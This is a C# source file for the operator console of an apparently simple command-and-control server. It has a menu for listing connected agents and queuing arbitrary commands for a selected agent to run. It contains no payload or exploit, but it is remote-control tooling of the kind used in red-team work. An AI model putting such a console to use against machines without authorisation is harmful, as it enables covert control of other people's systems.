using System;
using System.Collections.Generic;
using Spectre.Console;
using System.Linq;

namespace server{
    public class UserInput{
        //Main class for C2 Operator input
        public Listener listener {get; set;}

        public UserInput(Listener listener){
            //pass our listener into this object
            this.listener = listener;
            Console.WriteLine(@"
_________         _________ _               ______   _______ 
\__   __/|\     /|\__   __/( (    /|       (  __  \ (  ____ )
   ) (   | )   ( |   ) (   |  \  ( |       | (  \  )| (    )|
   | |   | (___) |   | |   |   \ | | _____ | |   ) || (____)|
   | |   |  ___  |   | |   | (\ \) |(_____)| |   | ||     __)
   | |   | (   ) |   | |   | | \   |       | |   ) || (\ (   
   | |   | )   ( |___) (___| )  \  |       | (__/  )| ) \ \__
   )_(   |/     \|\_______/|/    )_)       (______/ |/   \__/
                                                             
            ");
        }

        private string Menu(){
            //returns a menu
            //should be made generic and with input
            //in the constructor *theoretically*
            Console.WriteLine("");
            //the following are modified from Spectre Console docs
            // https://spectreconsole.net/widgets/table
            // https://spectreconsole.net/prompts/selection
            // Create a table
            var table = new Table();

            // Add some columns
            table.AddColumn("#");
            table.AddColumn(new TableColumn("Command"));

            // Add some rows
            table.AddRow("1","[red]Exit[/]");
            table.AddRow("2","[blue]List all Clients[/]");
            table.AddRow("3","[green]Set a Command[/]");

            // Render the table to the console
            AnsiConsole.Write(table);
            // added a prompt for the menu
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("What would you like to do?")
                    .PageSize(10)
                    .AddChoices(new[] {
                        "Exit", "List Clients", "Set Command"
            }));
            return prompt;
        }

        public void MenuInput(){
            //User input for the server
            //Menu Backend
            bool menuLoop = true;
            while(menuLoop){
                string input = Menu();
                switch(input){
                    case "Exit":
                        //exiting our loop here will terminate the server
                        menuLoop = false;
                        break;
                    case "List Clients":
                        Console.WriteLine("Registered Clients:");
                        foreach(var agent in ListClients()){
                            Console.WriteLine(agent);
                        }
                        break;
                    case "Set Command":
                        SetCommand();
                        break;
                    default: 
                        Console.WriteLine("\nInvalid input; Please try again.");
                        break;
                }
            }
        }
        public string[] ListClients(){
            //Converts client list to a string array
            List<Agent> agents = this.listener.agents;
            string[] agentArr = new string[agents.Count];
            int count = 0;
            foreach (var agent in agents){
                agentArr[count] = agent.name;
                count++;
            }
            return agentArr;
        }

        public int SetCommand(){
            //set a command for a client to query
            //set the "query buffer" to be json including the hostname and the command
            //Console.WriteLine("Type the name of the client you would like to send a command to: ");
            //Console.WriteLine("List: ");
            //ListClients();
            //Console.Write("\n");
            //string client = Console.ReadLine();
            //search our listener's list for the specified agent
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you would like to send a command to")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );
            foreach (var agent in this.listener.agents){
               if(agent.name == prompt){
                  Console.WriteLine("What command do you want to run: ");
                  string command = Console.ReadLine();
                  agent.commandQue.AddLast(command);
                  return 0;
               }
            }
            return 1;
        }
    }
}